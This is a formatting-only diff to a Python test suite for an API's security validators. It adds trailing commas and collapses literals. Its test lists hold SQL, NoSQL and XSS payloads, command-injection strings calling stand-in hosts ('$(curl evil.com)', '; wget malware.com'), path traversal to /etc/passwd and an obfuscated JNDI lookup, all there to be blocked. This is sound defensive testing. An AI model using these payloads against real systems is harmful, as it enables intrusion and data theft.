@@ -18,14 +18,14 @@ from api.utils.security_validation import (
     validate_evidence_data,
     validate_business_profile_data,
     validate_integration_data,
-    handle_validation_error
+    handle_validation_error,
 )
 from api.dependencies.security_validation import (
     SecurityDependencies,
     validate_request,
     validate_json_body,
     validate_file_upload,
-    validate_auth_token
+    validate_auth_token,
 )
 from utils.input_validation import InputValidator
 
@@ -41,7 +41,7 @@ class TestSecurityValidator:
             "admin' --",
             "SELECT * FROM users WHERE id = 1",
             "1 UNION SELECT * FROM passwords",
-            "'; INSERT INTO users VALUES ('hacker', 'password'); --"
+            "'; INSERT INTO users VALUES ('hacker', 'password'); --",
         ]
 
         for dangerous_input in dangerous_inputs:
@@ -57,7 +57,7 @@ class TestSecurityValidator:
             '{"$gt": ""}',
             '{"$where": "this.password == \'password\'"}',
             '{"username": {"$regex": ".*"}}',
-            'javascript:alert(1)'
+            "javascript:alert(1)",
         ]
 
         for dangerous_input in dangerous_inputs:
@@ -74,7 +74,7 @@ class TestSecurityValidator:
             "<iframe src='evil.com'></iframe>",
             "<body onload=alert('XSS')>",
             "document.cookie",
-            "<svg onload=alert(1)>"
+            "<svg onload=alert(1)>",
         ]
 
         for dangerous_input in dangerous_inputs:
@@ -91,7 +91,7 @@ class TestSecurityValidator:
             "`whoami`",
             "$(curl evil.com)",
             "; wget malware.com",
-            "& powershell.exe"
+            "& powershell.exe",
         ]
 
         for dangerous_input in dangerous_inputs:
@@ -106,7 +106,7 @@ class TestSecurityValidator:
             "..\\..\\windows\\system32",
             "%2e%2e%2f%2e%2e%2f",
             "....//....//etc/passwd",
-            "C:\\Windows\\System32"
+            "C:\\Windows\\System32",
         ]
 
         for dangerous_input in dangerous_inputs:
@@ -122,7 +122,7 @@ class TestSecurityValidator:
             "John Doe",
             "123 Main Street",
             "Product description with special chars: $99.99",
-            "Markdown text with **bold** and _italic_"
+            "Markdown text with **bold** and _italic_",
         ]
 
         for safe_input in safe_inputs:
@@ -140,13 +140,7 @@ class TestSecurityValidator:
                             "level5": {
                                 "level6": {
                                     "level7": {
-                                        "level8": {
-                                            "level9": {
-                                                "level10": {
-                                                    "level11": "too deep"
-                                                }
-                                            }
-                                        }
+                                        "level8": {"level9": {"level10": {"level11": "too deep"}}}
                                     }
                                 }
                             }
@@ -163,11 +157,7 @@ class TestSecurityValidator:
 
     def test_validate_json_payload_dangerous_keys(self):
         """Test JSON payload with dangerous keys."""
-        dangerous_payload = {
-            "$where": "malicious",
-            "'; DROP TABLE": "value",
-            "<script>": "xss"
-        }
+        dangerous_payload = {"$where": "malicious", "'; DROP TABLE": "value", "<script>": "xss"}
 
         with pytest.raises(HTTPException) as exc:
             SecurityValidator.validate_json_payload(dangerous_payload)
@@ -237,19 +227,14 @@ class TestSecurityValidator:
         dangerous_params = {
             "search": "'; DROP TABLE users; --",
             "filter": "<script>alert(1)</script>",
-            "sort": "../../etc/passwd"
+            "sort": "../../etc/passwd",
         }
 
         with pytest.raises(HTTPException):
             SecurityValidator.validate_query_params(dangerous_params)
 
         # Safe query params
-        safe_params = {
-            "search": "user query",
-            "page": "1",
-            "limit": "10",
-            "sort": "created_at"
-        }
+        safe_params = {"search": "user query", "page": "1", "limit": "10", "sort": "created_at"}
 
         result = SecurityValidator.validate_query_params(safe_params)
         assert result is not None
@@ -261,7 +246,7 @@ class TestSecurityValidator:
             "Authorization": "Bearer secret_token",
             "X-API-Key": "api_key_123",
             "Content-Type": "application/json",
-            "X-Custom": "<script>alert(1)</script>"
+            "X-Custom": "<script>alert(1)</script>",
         }
 
         result = SecurityValidator.validate_headers(headers)
@@ -294,9 +279,7 @@ class TestSecurityValidator:
         # But still block SQL injection in lenient mode
         sql_injection = "'; DROP TABLE users; --"
         with pytest.raises(HTTPException):
-            SecurityValidator.validate_no_dangerous_content(
-                sql_injection, "query", mode="lenient"
-            )
+            SecurityValidator.validate_no_dangerous_content(sql_injection, "query", mode="lenient")
 
         # Test XSS-only mode for UI fields
         ui_text = "Click here to continue"
@@ -376,6 +359,7 @@ class TestSecurityDependencies:
         # Valid JSON
         async def mock_json():
             return {"name": "John", "email": "john@example.com"}
+
         mock_request.json = mock_json
 
         result = await SecurityDependencies.validate_json_body(mock_request)
@@ -385,6 +369,7 @@ class TestSecurityDependencies:
         # Invalid JSON with dangerous content
         async def dangerous_json():
             return {"sql": "'; DROP TABLE users; --"}
+
         mock_request.json = dangerous_json
 
         with pytest.raises(HTTPException):
@@ -416,11 +401,7 @@ class TestInputValidation:
 
     def test_email_validation(self):
         """Test email validation."""
-        valid_emails = [
-            "user@example.com",
-            "test.user@company.co.uk",
-            "admin+test@domain.org"
-        ]
+        valid_emails = ["user@example.com", "test.user@company.co.uk", "admin+test@domain.org"]
 
         for email in valid_emails:
             result = InputValidator.validate_email(email)
@@ -431,7 +412,7 @@ class TestInputValidation:
             "@example.com",
             "user@",
             "user@.com",
-            "<script>@example.com"
+            "<script>@example.com",
         ]
 
         for email in invalid_emails:
@@ -440,11 +421,7 @@ class TestInputValidation:
 
     def test_password_validation(self):
         """Test password strength validation."""
-        strong_passwords = [
-            "StrongP@ssw0rd123",
-            "C0mpl3x!Password",
-            "MyS3cur3P@ssphrase"
-        ]
+        strong_passwords = ["StrongP@ssw0rd123", "C0mpl3x!Password", "MyS3cur3P@ssphrase"]
 
         for password in strong_passwords:
             # Should not raise exception
@@ -456,7 +433,7 @@ class TestInputValidation:
             "NoNumbers!",
             "nouppercase123!",
             "NOLOWERCASE123!",
-            "NoSpecial123"
+            "NoSpecial123",
         ]
 
         for password in weak_passwords:
@@ -469,7 +446,7 @@ class TestInputValidation:
             "https://example.com",
             "http://localhost:8000",
             "https://api.service.com/endpoint",
-            "https://sub.domain.co.uk/path?query=value"
+            "https://sub.domain.co.uk/path?query=value",
         ]
 
         for url in valid_urls:
@@ -480,7 +457,7 @@ class TestInputValidation:
             "not a url",
             "javascript:alert(1)",
             "file:///etc/passwd",
-            "ftp://insecure.com"
+            "ftp://insecure.com",
         ]
 
         for url in invalid_urls:
@@ -533,12 +510,7 @@ class TestEdgeCases:
 
     def test_unicode_input_validation(self):
         """Test validation of Unicode inputs."""
-        unicode_inputs = [
-            "Hello 世界",
-            "Привет мир",
-            "مرحبا بالعالم",
-            "🚀 Emoji test 🎉"
-        ]
+        unicode_inputs = ["Hello 世界", "Привет мир", "مرحبا بالعالم", "🚀 Emoji test 🎉"]
 
         for input_text in unicode_inputs:
             result = SecurityValidator.validate_no_dangerous_content(input_text)
@@ -558,7 +530,7 @@ class TestEdgeCases:
             "normal'; DROP TABLE users; --text",  # SQL in middle
             "%3Cscript%3Ealert(1)%3C/script%3E",  # URL encoded XSS
             "<<script>script>alert(1)<</script>/script>",  # Nested tags
-            "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://example.com}"  # JNDI
+            "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://example.com}",  # JNDI
         ]
 
         for attempt in nested_attempts:
